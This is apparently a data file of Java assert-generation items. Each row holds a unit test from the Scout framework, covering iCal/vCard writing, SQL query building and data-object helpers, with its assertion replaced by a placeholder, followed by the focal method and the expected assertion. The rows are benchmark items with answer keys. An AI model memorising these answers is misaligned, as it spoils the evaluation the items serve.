getTableStatus() { T table = getTable(); if (table != null) { return table.getTableStatus(); } return null; }"	assertSame(status, getTable().getTableStatus())
"testWrite() { ICalBean cal = BEANS.get(ICalBean.class); ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class);  Date prodDate = BEANS.get(IDateProvider.class).currentMillis(); Date startDate = DateUtility.addDays(BEANS.get(IDateProvider.class).currentMillis(), 1); Date endDate = DateUtility.addHours(startDate, 2); String uid = ""e11d9aac-890f-409b-a016-3acef4685dc6"";  cal.addProperty(ICalProperties.PROP_BEGIN_ICALENDAR); cal.addProperty(ICalProperties.PROP_VERSION_2_0); cal.addProperty(new Property(ICalProperties.PROP_NAME_PRODID, ""prodid doe corporation"")); cal.addProperty(ICalProperties.PROP_BEGIN_VEVENT); cal.addProperty(new Property(ICalProperties.PROP_NAME_DTSTAMP, helper.createDateTime(prodDate))); cal.addProperty(new Property(ICalProperties.PROP_NAME_UID, uid)); cal.addProperty(new Property(ICalProperties.PROP_NAME_DTSTART, helper.createDateTime(startDate))); cal.addProperty(new Property(ICalProperties.PROP_NAME_DTEND, helper.createDateTime(endDate))); cal.addProperty(new Property(ICalProperties.PROP_NAME_ORGANIZER, Arrays.asList(new PropertyParameter(ICalProperties.PARAM_NAME_CN, """"John Doe"""")), ""mailto:john@doe.mail.com""));  cal.addProperty(ICalProperties.PROP_END_VEVENT); cal.addProperty(ICalProperties.PROP_END_ICALENDAR);  StringWriter bw = new StringWriter(); cal.write(bw, ""utf-8"");  String writtenIcal = bw.toString();  ""<AssertPlaceHolder>"";CHARSET=utf-8:prodid doe corporation\r\n"" + ""BEGIN:VEVENT\r\n"" + ""DTSTAMP;CHARSET=utf-8:"" + helper.createDateTime(prodDate) + ""\r\n"" + ""UID;CHARSET=utf-8:"" + uid + ""\r\n"" + ""DTSTART;CHARSET=utf-8:"" + helper.createDateTime(startDate) + ""\r\n"" + ""DTEND;CHARSET=utf-8:"" + helper.createDateTime(endDate) + ""\r\n"" + ""ORGANIZER;CHARSET=utf-8;CN=""John Doe"":mailto:john@doe.mail.com\r\n"" + ""END:VEVENT\r\n"" + ""END:VCALENDAR\r\n"", writtenIcal); }
write(Writer w, String charset) { BEANS.get(ICalVCardHelper.class).write(this, w, charset); }"	"assertEquals(""BEGIN:VCALENDAR\r\n"" + ""VERSION:2.0\r\n"" + ""PRODID"
"testMeetingWithAlarm() { final String uid = ""5edf8af0-5347-4331-ae0f-3b4980180b37""; ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); Date startDate = createTestDate(14, 30, 0); Date endDate = DateUtility.addHours(startDate, 1);  ICalBean cal = BEANS.get(ICalBuilder.class) .withProductIdentifier(""IDENTIFIER"") .withComponent(BEANS.get(ICalVEventBuilder.class) .withDescription(""description"") .withLocation(""location"") .withAlarm(Duration.ofDays(1), ""ALARMDESC"") .withSummary(""summary"") .withScheduling(startDate, endDate, false, m_testingTimeZone) .withUid(uid)) .build();  String expectedContent = ""BEGIN:VCALENDAR\r\n"" + ""VERSION:2.0\r\n"" + ""PRODID;CHARSET=utf-8:IDENTIFIER\r\n"" + ""BEGIN:VEVENT\r\n"" + ""DTSTAMP;CHARSET=utf-8:"" + helper.createDateTime(s_mockDate) + ""\r\n"" + ""DESCRIPTION;CHARSET=utf-8:description\r\n"" + ""LOCATION;CHARSET=utf-8:location\r\n"" + ""BEGIN:VALARM\r\n"" + ""ACTION;CHARSET=utf-8:DISPLAY\r\n"" + ""TRIGGER;CHARSET=utf-8:-PT24H\r\n"" + ""DESCRIPTION;CHARSET=utf-8:ALARMDESC\r\n"" + ""END:VALARM\r\n"" + ""SUMMARY;CHARSET=utf-8:summary\r\n"" + ""DTSTART;CHARSET=utf-8:20200820T113000Z\r\n"" + // -3 from the input date because it is converted to UTC ""DTEND;CHARSET=utf-8:20200820T123000Z\r\n"" + // -3 from the input date because it is converted to UTC ""UID;CHARSET=utf-8:5edf8af0-5347-4331-ae0f-3b4980180b37\r\n"" + ""END:VEVENT\r\n"" + ""END:VCALENDAR\r\n""; String createdContent = new String(cal.toBytes(StandardCharsets.UTF_8.name()), StandardCharsets.UTF_8); ""<AssertPlaceHolder>""; }
build() { buildComponents(); end(); return m_ical; }"	assertEquals(expectedContent, createdContent)
"testWithLocalDate() { LocalDate startDate = LocalDate.of(2020, 3, 11); LocalDate endDate = LocalDate.of(2020, 3, 13); final String uid = ""5edf8af0-5347-4331-ae0f-3b4980180b37""; ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); ICalBean cal = BEANS.get(ICalBuilder.class) .withProductIdentifier(""IDENTIFIER"") .withComponent(BEANS.get(ICalVEventBuilder.class) .withDescription(""description"") .withLocation(""location"") .withSummary(""summary"") .withScheduling(startDate, endDate) .withUid(uid)) .build(); String expectedContent = ""BEGIN:VCALENDAR\r\n"" + ""VERSION:2.0\r\n"" + ""PRODID;CHARSET=utf-8:IDENTIFIER\r\n"" + ""BEGIN:VEVENT\r\n"" + ""DTSTAMP;CHARSET=utf-8:"" + helper.createDateTime(s_mockDate) + ""\r\n"" + ""DESCRIPTION;CHARSET=utf-8:description\r\n"" + ""LOCATION;CHARSET=utf-8:location\r\n"" + ""SUMMARY;CHARSET=utf-8:summary\r\n"" + ""DTSTART;CHARSET=utf-8:20200311\r\n"" + ""DTEND;CHARSET=utf-8:20200314\r\n"" + ""UID;CHARSET=utf-8:5edf8af0-5347-4331-ae0f-3b4980180b37\r\n"" + ""END:VEVENT\r\n"" + ""END:VCALENDAR\r\n""; String createdContent = new String(cal.toBytes(StandardCharsets.UTF_8.name()), StandardCharsets.UTF_8); ""<AssertPlaceHolder>""; }
build() { buildComponents(); end(); return m_ical; }"	assertEquals(expectedContent, createdContent)
"testCreateDateTimeGMT() { ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(""GMT"")); cal.set(2019, Calendar.AUGUST, 23, 15, 22, 11); ""<AssertPlaceHolder>""; }
createDateTime(Date d) { // Shift the timezone to UTC TimeZone utc = TimeZone.getTimeZone(""UTC""); SimpleDateFormat dateFormatter = new SimpleDateFormat(YEAR_MONTH_DAY_FORMAT); dateFormatter.setTimeZone(utc); SimpleDateFormat timeFormatter = new SimpleDateFormat(HOUR_MINUTE_FORMAT); timeFormatter.setTimeZone(utc); // ICal pattern: <yyyyMMdd>T<HHmmss>Z; T => time start marker, Z => time end marker; we always truncate secs return dateFormatter.format(d) + ""T"" + timeFormatter.format(d) + ""00Z""; }"	"assertEquals(""20190823T152200Z"", helper.createDateTime(cal.getTime()))"
"testCreateDateTimeGMT_1() { ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(""GMT+1"")); cal.set(2019, Calendar.AUGUST, 23, 15, 22, 11); ""<AssertPlaceHolder>""; }
createDateTime(Date d) { // Shift the timezone to UTC TimeZone utc = TimeZone.getTimeZone(""UTC""); SimpleDateFormat dateFormatter = new SimpleDateFormat(YEAR_MONTH_DAY_FORMAT); dateFormatter.setTimeZone(utc); SimpleDateFormat timeFormatter = new SimpleDateFormat(HOUR_MINUTE_FORMAT); timeFormatter.setTimeZone(utc); // ICal pattern: <yyyyMMdd>T<HHmmss>Z; T => time start marker, Z => time end marker; we always truncate secs return dateFormatter.format(d) + ""T"" + timeFormatter.format(d) + ""00Z""; }"	"assertEquals(""20190823T142200Z"", helper.createDateTime(cal.getTime()))"
"testCreateDate() { ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(""GMT"")); cal.set(2019, Calendar.AUGUST, 23, 15, 22, 0); ""<AssertPlaceHolder>""; }
createDate(Date d) { // Shift the timezone to UTC SimpleDateFormat dateFormatter = new SimpleDateFormat(YEAR_MONTH_DAY_FORMAT); dateFormatter.setTimeZone(TimeZone.getTimeZone(""UTC"")); // ICal DATE pattern: <yyyyMMdd> return dateFormatter.format(d); }"	"assertEquals(""20190823"", helper.createDate(cal.getTime()))"
"testWrite() { VCardBean vcard = BEANS.get(VCardBean.class); ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); vcard.addProperty(VCardProperties.PROP_BEGIN_VCARD); vcard.addProperty(VCardProperties.PROP_VERSION_3_0); vcard.addProperty(new Property(VCardProperties.PROP_NAME_PRODID, ""PRODID"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_FN, ""John Doe"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_N, helper.composeStructuredValueFromSingleValues(""Doe"", ""John"", ""Hannes"", ""Dr."", null))); vcard.addProperty(new Property(VCardProperties.PROP_NAME_TEL, Arrays.asList(new PropertyParameter(VCardProperties.PARAM_NAME_TYPE, VCardProperties.PARAM_VALUE_VOICE, VCardProperties.PARAM_VALUE_WORK)), ""0998887766"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_TITLE, ""Software Engineer"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_EMAIL, Arrays.asList(new PropertyParameter(VCardProperties.PARAM_NAME_TYPE, VCardProperties.PARAM_VALUE_WORK)), ""john.doe@email.com"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_ORG, helper.composeStructuredValueFromSingleValues(""Doe Corporation""))); vcard.addProperty(new Property(VCardProperties.PROP_NAME_ADR, Arrays.asList(new PropertyParameter(VCardProperties.PARAM_NAME_TYPE, VCardProperties.PARAM_VALUE_HOME)), helper.composeStructuredValueFromSingleValues(null, null, ""Bahnhofweg"", ""Zurich"", null, ""8000"", ""Switzerland"")));  vcard.addProperty(VCardProperties.PROP_END_VCARD);  StringWriter w = new StringWriter(); vcard.write(w, ""utf-8""); String writtenVCard = w.toString();  ""<AssertPlaceHolder>"";CHARSET=utf-8:PRODID\r\n"" + ""FN;CHARSET=utf-8:John Doe\r\n"" + ""N;CHARSET=utf-8:Doe;John;Hannes;Dr.;\r\n"" + ""TEL;CHARSET=utf-8;TYPE=VOICE,WORK:0998887766\r\n"" + ""TITLE;CHARSET=utf-8:Software Engineer\r\n"" + ""EMAIL;CHARSET=utf-8;TYPE=WORK:john.doe@email.com\r\n"" + ""ORG;CHARSET=utf-8:Doe Corporation\r\n"" + ""ADR;CHARSET=utf-8;TYPE=HOME:;;Bahnhofweg;Zurich;;8000;Switzerland\r\n"" + ""END:VCARD\r\n"" + """", writtenVCard); }
write(Writer w, String charset) { BEANS.get(ICalVCardHelper.class).write(this, w, charset); }"	"assertEquals(""BEGIN:VCARD\r\n"" + ""VERSION:3.0\r\n"" + ""PRODID"
"testVCard() { VCardBean vcard = BEANS.get(VCardBuilder.class) .withDisplayName(""displayname"") .withName(""Tommy"", ""middlename"", ""Mustermann"", ""Dr."") .withEmail(VCardProperties.PARAM_VALUE_HOME, ""tommy@mustermann.de"") .withJobTitle(""Software Engineer"") .withOrganizations(""Mustermann GmbH"", ""mustermann.de"") .withProductIdentifier(""productidentifiert"") .withTel(VCardProperties.PARAM_VALUE_WORK, VCardProperties.PARAM_VALUE_CELL, ""0776665544"") .withAddress(VCardProperties.PARAM_VALUE_HOME, ""Bahnhofstrasse"", ""1234"", ""Entenhausen"", ""Schweiz"") .build();  ""<AssertPlaceHolder>"";CHARSET=utf-8:displayname\r\n"" + ""N;CHARSET=utf-8:Mustermann;Tommy;middlename;Dr.;\r\n"" + ""EMAIL;CHARSET=utf-8;TYPE=HOME:tommy@mustermann.de\r\n"" + ""TITLE;CHARSET=utf-8:Software Engineer\r\n"" + ""ORG;CHARSET=utf-8:Mustermann GmbH;mustermann.de\r\n"" + ""PRODID;CHARSET=utf-8:productidentifiert\r\n"" + ""TEL;CHARSET=utf-8;TYPE=WORK,CELL:0776665544\r\n"" + ""ADR;CHARSET=utf-8;TYPE=HOME:;;Bahnhofstrasse;Entenhausen;;1234;Schweiz\r\n"" + ""END:VCARD\r\n"", new String(vcard.toBytes(""utf-8""))); }
build() { end(); return m_vcard; }"	"assertEquals(""BEGIN:VCARD\r\n"" + ""VERSION:3.0\r\n"" + ""FN"
"testComposerField() { MyComposerField composer = new MyComposerField(); composer.init(); runBasicAsserts(composer);  CarEntity carEntity = composer.new CarEntity(); ITreeNode carNode = composer.addEntityNode( composer.getTree().getRootNode(), carEntity, true, Collections.emptyList(), new ArrayList<>());  composer.addAttributeNode(carNode, carEntity.new ColorAttribute(), DataModelConstants.AGGREGATION_NONE, DataModelAttributeOp.create(DataModelConstants.OPERATOR_EQ), CollectionUtility.arrayList(""blue key""), CollectionUtility.arrayList(""blue value"")); m_searchFilterService.applySearchDelegate(composer, m_searchFilter, false); StringBuilder result = new StringBuilder(); new ComposerDisplayTextBuilder().build(composer.getTree().getRootNode(), result, """"); Assert.""<AssertPlaceHolder>""; }
applySearchDelegate(IFormField field, SearchFilter search, boolean includeChildren) { super.applySearchDelegate(field, search, includeChildren);  //composer if (field instanceof AbstractComposerField) { AbstractComposerField composerField = (AbstractComposerField) field; ITreeNode rootNode = composerField.getTree().getRootNode(); if (rootNode != null) { StringBuilder buf = new StringBuilder(); new ComposerDisplayTextBuilder().build(rootNode, buf, """"); String s = buf.toString(); if (StringUtility.hasText(s)) { search.addDisplayText(s); } } } }"	assertEquals(result.toString().trim(), m_searchFilter.getDisplayTextsPlain())
"testMerge() { EntityContribution e = new EntityContribution(); e.getFromParts().add(""ADDRESS A""); e.getFromParts().add(""INNER JOIN CONTACT C ON C.PERSON_ID=P.PERSON_ID""); String s = EntityContributionUtility.mergeContributions(EntityStrategy.BuildQuery, ""select 1 from <fromParts>user u</fromParts> where 1=1"", e, true).getSelectParts().get(0); Assert.""<AssertPlaceHolder>""; }
mergeContributions(EntityStrategy entityStrategy, final String entityPartWithTags, EntityContribution childContributions, boolean consumeChildContributions) { String entityPart = entityPartWithTags; EntityContribution parentContrib = new EntityContribution(); //PROCESS collectiong tags: selectParts, fromParts, whereParts, groupBy, groupByParts, havingParts if (!consumeChildContributions) { //just proxy through to parent parentContrib.add(childContributions); } else { // extend the select section if (!childContributions.getSelectParts().isEmpty()) { StringBuilder selectBuf = new StringBuilder(); for (String selectPart : childContributions.getSelectParts()) { if (selectBuf.length() > 0) { selectBuf.append("", ""); } selectBuf.append(autoBracketSelectPart(selectPart)); } final String s = selectBuf.toString(); if (StringUtility.getTag(entityPart, ""selectParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""selectParts"", (tagName, tagContent) -> { if (!tagContent.isEmpty()) { return tagContent + "", "" + s; } return s; }); } else { throw new IllegalArgumentException(""missing <selectParts/> tag""); } } entityPart = StringUtility.removeTagBounds(entityPart, ""selectParts""); // extend the from section Set<String> fromParts = new TreeSet<>(childContributions.getFromParts()); if (!fromParts.isEmpty()) { StringBuilder buf = new StringBuilder(); for (String fromPart : fromParts) { if (!isAnsiJoin(fromPart)) { buf.append("",""); } buf.append("" ""); buf.append(fromPart); } final String s = buf.toString(); if (StringUtility.getTag(entityPart, ""fromParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""fromParts"", (tagName, tagContent) -> tagContent + s); } else { throw new IllegalArgumentException(""missing <fromParts/> tag""); } } entityPart = StringUtility.removeTagBounds(entityPart, ""fromParts""); // extend the where section if (!childContributions.getWhereParts().isEmpty()) {  final String s = CollectionUtility.format(childContributions.getWhereParts(), "" AND ""); if (StringUtility.getTag(entityPart, ""whereParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""whereParts"", (tagName, tagContent) -> { return tagContent + "" AND "" + s;//legacy: always prefix an additional AND }); } else { entityPart = entityPart + "" AND "" + s; } } entityPart = StringUtility.removeTagBounds(entityPart, ""whereParts""); // extend the group by / having section if (StringUtility.getTag(entityPart, ""groupBy"") != null) { int selectGroupByDelta = childContributions.getSelectParts().size() - childContributions.getGroupByParts().size(); if ((selectGroupByDelta > 0 && !childContributions.getGroupByParts().isEmpty()) || !childContributions.getHavingParts().isEmpty()) { entityPart = StringUtility.removeTagBounds(entityPart, ""groupBy""); if (!childContributions.getGroupByParts().isEmpty()) { //check group by parts for (String s : childContributions.getGroupByParts()) { checkGroupByPart(s); } final String s = CollectionUtility.format(childContributions.getGroupByParts(), "", ""); if (StringUtility.getTag(entityPart, ""groupByParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""groupByParts"", (tagName, tagContent) -> { if (!tagContent.isEmpty()) { return tagContent + "", "" + s; } return s; }); } else { throw new IllegalArgumentException(""missing <groupByParts/> tag""); } } else { //no group by parts, avoid empty GROUP BY clause entityPart = StringUtility.replaceTags(entityPart, ""groupByParts"", (tagName, tagContent) -> { if (!tagContent.isEmpty()) { return tagContent; } return tagContent + "" 1 ""; }); } entityPart = StringUtility.removeTagBounds(entityPart, ""groupByParts""); // if (!childContributions.getHavingParts().isEmpty()) { final String s = CollectionUtility.format(childContributions.getHavingParts(), "" AND ""); if (StringUtility.getTag(entityPart, ""havingParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""havingParts"", (tagName, tagContent) -> { return tagContent + "" AND "" + s;//legacy: always prefix an additional AND }); } else { throw new IllegalArgumentException(""missing <havingParts/> tag""); } } else { entityPart = StringUtility.removeTagBounds(entityPart, ""havingParts""); } } else { entityPart = StringUtility.replaceTags(entityPart, ""groupBy"", (tagName, tagContent) -> { if (!StringUtility.hasText(StringUtility.getTag(tagContent, ""groupByParts"")) && !StringUtility.hasText(StringUtility.getTag(tagContent, ""havingParts""))) { return """"; }  // preserve statically defined group-by and having parts tagContent = StringUtility.replaceTags(tagContent, ""groupByParts"", (innerTagName, innerTagContent) -> { if (!innerTagContent.isEmpty()) { return innerTagContent; } return innerTagContent + "" 1 ""; }); tagContent = StringUtility.replaceTags(tagContent, ""havingParts"", (innerTagName, innerTagContent) -> innerTagContent); return tagContent; }); } } } //PROCESS contributing tags: selectPart, fromPart, wherePart, groupByPart, havingPart String selectPart = StringUtility.getTag(entityPart, ""selectPart""); if (selectPart != null) { parentContrib.getSelectParts().add(selectPart); entityPart = StringUtility.removeTag(entityPart, ""selectPart"").trim(); } // String fromPart = StringUtility.getTag(entityPart, ""fromPart""); if (fromPart != null) { parentContrib.getFromParts().add(fromPart); entityPart = StringUtility.removeTag(entityPart, ""fromPart"").trim(); } // String wherePart = StringUtility.getTag(entityPart, ""wherePart""); if (wherePart != null) { parentContrib.getWhereParts().add(wherePart); entityPart = StringUtility.removeTag(entityPart, ""wherePart"").trim(); } // String groupByPart = StringUtility.getTag(entityPart, ""groupByPart""); if (groupByPart != null) { parentContrib.getGroupByParts().add(groupByPart); entityPart = StringUtility.removeTag(entityPart, ""groupByPart"").trim(); } // String havingPart = StringUtility.getTag(entityPart, ""havingPart""); if (havingPart != null) { parentContrib.getHavingParts().add(havingPart); entityPart = StringUtility.removeTag(entityPart, ""havingPart"").trim(); } if (parentContrib.isEmpty()) { switch (entityStrategy) { case BuildConstraints: { parentContrib.getWhereParts().add(entityPart); break; } case BuildQuery: { parentContrib.getSelectParts().add(entityPart); parentContrib.getGroupByParts().add(""1""); break; } } } else { //check for remaining dirt if (!entityPart.isEmpty()) { LOG.warn(""entityPart {} contains content that is not wrapped in a tag: {}"", entityPartWithTags, entityPart); } } return parentContrib; }"	"assertEquals(""select 1 from user u, ADDRESS A INNER JOIN CONTACT C ON C.PERSON_ID=P.PERSON_ID where 1=1"", s)"
"createSelectStatementStatementNull() { m_builder.build(m_formData); Assert.""<AssertPlaceHolder>""; }
build(AbstractFormData formData) { m_where = new StringBuilder(); // get all formData fields and properties defined directly and indirectly by extending template fields, respectively //build constraints for fields for (BasicPartDefinition def : m_basicDefs) { if (def.accept(formData)) { Map<String, String> parentAliasMap = getAliasMapper().getRootAliases(); EntityContribution contrib = def.createInstance(this, formData, parentAliasMap); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } //build constraints for composer trees Map<Integer, Map<String, AbstractFormFieldData>> fieldsBreathFirstMap = formData.getAllFieldsRec(); for (Map<String, AbstractFormFieldData> map : fieldsBreathFirstMap.values()) { for (AbstractFormFieldData f : map.values()) { if (f.isValueSet() && f instanceof AbstractTreeFieldData) { // composer tree with entity, attribute EntityContribution contrib = buildTreeNodes(((AbstractTreeFieldData) f).getRoots(), EntityStrategy.BuildConstraints, AttributeStrategy.BuildConstraintOfAttributeWithContext); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } } return getWhereConstraints(); }"	assertNull(m_builder.createSelectStatement(null))
"createSelectStatementContributionNullContributions() { m_builder.build(m_formData); String actual = m_builder.createSelectStatement(STATEMENT_TEMPLATE, null, null); Assert.""<AssertPlaceHolder>""; }
build(AbstractFormData formData) { m_where = new StringBuilder(); // get all formData fields and properties defined directly and indirectly by extending template fields, respectively //build constraints for fields for (BasicPartDefinition def : m_basicDefs) { if (def.accept(formData)) { Map<String, String> parentAliasMap = getAliasMapper().getRootAliases(); EntityContribution contrib = def.createInstance(this, formData, parentAliasMap); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } //build constraints for composer trees Map<Integer, Map<String, AbstractFormFieldData>> fieldsBreathFirstMap = formData.getAllFieldsRec(); for (Map<String, AbstractFormFieldData> map : fieldsBreathFirstMap.values()) { for (AbstractFormFieldData f : map.values()) { if (f.isValueSet() && f instanceof AbstractTreeFieldData) { // composer tree with entity, attribute EntityContribution contrib = buildTreeNodes(((AbstractTreeFieldData) f).getRoots(), EntityStrategy.BuildConstraints, AttributeStrategy.BuildConstraintOfAttributeWithContext); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } } return getWhereConstraints(); }"	"assertEquals(""SELECT P.PERSON_NR FROM ORS_PERSON P WHERE 1=1"", StringUtility.cleanup(actual))"
"createSelectStatementWhereConstraintsOnly() { m_builder.build(m_formData); m_builder.addWhere("" AND 0=0 ""); String actual = m_builder.createSelectStatement(STATEMENT_TEMPLATE); Assert.""<AssertPlaceHolder>""; }
build(AbstractFormData formData) { m_where = new StringBuilder(); // get all formData fields and properties defined directly and indirectly by extending template fields, respectively //build constraints for fields for (BasicPartDefinition def : m_basicDefs) { if (def.accept(formData)) { Map<String, String> parentAliasMap = getAliasMapper().getRootAliases(); EntityContribution contrib = def.createInstance(this, formData, parentAliasMap); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } //build constraints for composer trees Map<Integer, Map<String, AbstractFormFieldData>> fieldsBreathFirstMap = formData.getAllFieldsRec(); for (Map<String, AbstractFormFieldData> map : fieldsBreathFirstMap.values()) { for (AbstractFormFieldData f : map.values()) { if (f.isValueSet() && f instanceof AbstractTreeFieldData) { // composer tree with entity, attribute EntityContribution contrib = buildTreeNodes(((AbstractTreeFieldData) f).getRoots(), EntityStrategy.BuildConstraints, AttributeStrategy.BuildConstraintOfAttributeWithContext); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } } return getWhereConstraints(); }"	"assertEquals(""SELECT P.PERSON_NR FROM ORS_PERSON P WHERE 1=1 AND 0=0"", StringUtility.cleanup(actual))"
"createSelectStatementWithContribution() { m_builder.build(m_formData); EntityContribution contrib = new EntityContribution(); contrib.addSelectExpression(""MA.NAME"", false); contrib.addFromExpression(""ORS_PERSON MA""); contrib.addWhereConstraint(""MA.PERSON_NR != P.MAIN_ACCOUNT_NR""); m_builder.addWhere("" AND 0=0 ""); String actual = m_builder.createSelectStatement(STATEMENT_TEMPLATE, contrib); Assert.""<AssertPlaceHolder>""; }
createSelectStatement(String stm, EntityContribution... contributions) { EntityContribution mergedContribution = new EntityContribution(); if (contributions != null) { for (EntityContribution c : contributions) { mergedContribution.add(c); } } String where = StringUtility.trim(getWhereConstraints()); if (StringUtility.hasText(where)) { if (where.toUpperCase().startsWith(""AND"")) { where = where.substring(3); } mergedContribution.getWhereParts().add(where); } return createEntityPart(stm, false, mergedContribution); }"	"assertEquals(""SELECT P.PERSON_NR, MA.NAME FROM ORS_PERSON P, ORS_PERSON MA WHERE 1=1 AND MA.PERSON_NR != P.MAIN_ACCOUNT_NR AND 0=0"", StringUtility.cleanup(actual))"
"testHashCode() { ""<AssertPlaceHolder>""; }
hashCode() { return m_id.hashCode(); }"	assertEquals(FIXTURE_UUID_1.hashCode(), FIXTURE_UUID_1.hashCode())
"testUnwrap() { ""<AssertPlaceHolder>""; }
unwrap() { return m_id; }"	assertEquals(TEST_UUID, FIXTURE_UUID_1.unwrap())
"testUnwrapAsString() { ""<AssertPlaceHolder>""; }
unwrapAsString() { return unwrap().toString(); }"	assertEquals(TEST_UUID.toString(), FIXTURE_UUID_1.unwrapAsString())
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + "" ["" + m_id + ""]""; }"	"assertEquals(""FixtureStringId [mock]"", FixtureStringId.of(""mock"").toString())"
"testEnsureDeclaredNodesNullSafe() { ""<AssertPlaceHolder>""; }
ensureDeclaredNodes(E entity) { if (entity == null) { return null; } m_dataObjectInventory.get().getAttributesDescription(entity.getClass()) .values() .forEach(desc -> ensureNodeValue(entity, desc.getName(), desc.getType().getRawType(), null, false)); return entity; }"	assertNull(m_helper.ensureDeclaredNodes(null))
"testGetTypeNameToClassMapSize() { ""<AssertPlaceHolder>""; }
getTypeNameToClassMap() { return Collections.unmodifiableMap(m_typeNameToClassMap); }"	assertEquals(5, m_inventory.getTypeNameToClassMap().size())
"testForEachRec_List() { DoList<OtherEntityFixtureDo> list = new DoList<>(); list.addAll(fixtureEntity.getOtherEntitiesList());  List<OtherEntityFixtureDo> visited = new ArrayList<>(); DataObjectVisitors.forEachRec(list, OtherEntityFixtureDo.class, visited::add); ""<AssertPlaceHolder>"";  List<OtherEntityFixtureDo> expected = new ArrayList<>(); expected.addAll(fixtureEntity.getOtherEntitiesList()); CollectionUtility.containsAll(visited, expected); }
forEachRec(Object root, Class<? extends T> elementType, Consumer<T> consumer) { forEach(root, new P_TypedElementConsumer<>(elementType, consumer, true)); }"	assertEquals(2, visited.size())
"testReplaceEach_identity() { OtherEntityFixtureDo otherEntity = BEANS.get(OtherEntityFixtureDo.class) .withId(""otherId"");  EntityFixtureDo entity = BEANS.get(EntityFixtureDo.class) .withId(""myId"") .withOtherEntity(otherEntity);  DataObjectVisitors.replaceEach(entity, OtherEntityFixtureDo.class, o -> o); ""<AssertPlaceHolder>""; }
replaceEach(Object root, Class<? extends T> elementType, UnaryOperator<T> operator) { new P_ReplaceDataObjectVisitor<>(elementType, operator).visit(root); }"	assertEquals(otherEntity, entity.getOtherEntity())
"testReplaceEach_replaceAll_DoEntityContribution() { EntityContributionFixtureDo entityOtherContribution = BEANS.get(EntityContributionFixtureDo.class).withId(""other-entity-contribution""); DataObjectVisitors.replaceEach(fixtureEntity, EntityContributionFixtureDo.class, o -> entityOtherContribution); ""<AssertPlaceHolder>""; }
replaceEach(Object root, Class<? extends T> elementType, UnaryOperator<T> operator) { new P_ReplaceDataObjectVisitor<>(elementType, operator).visit(root); }"	assertEquals(entityOtherContribution, fixtureEntity.getContribution(EntityContributionFixtureDo.class))
"testBuildNullValues() { DoEntity expected = BEANS.get(DoEntity.class); expected.put(""attribute1"", null); expected.putList(""listAttribute1"", CollectionUtility.emptyArrayList()); expected.putList(""listAttribute2"", CollectionUtility.emptyArrayList());  IDoEntity actual = BEANS.get(DoEntityBuilder.class) .put(""attribute1"", null) .putList(""listAttribute1"", (Object[]) null) .putList(""listAttribute2"", (List<Object>) null) .build(); ""<AssertPlaceHolder>""; }
build() { return m_entity; }"	assertEqualsWithComparisonFailure(expected, actual)
"testGetString() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""foo"", ""bar""); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertEquals(""bar"", entity.getString(""foo""))"
"testGetString_NullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""bar"", null); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertNull(entity.getString(""bar""))"
"testGetList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getList(""bar"").isEmpty())"
"testGetList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getList(""bar"").get(0))"
"testGetStringList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getStringList(""bar"").isEmpty())"
"testGetStringList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getStringList(""bar"").get(0))"
"testGetBoolean() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""foo"", true); ""<AssertPlaceHolder>""; }
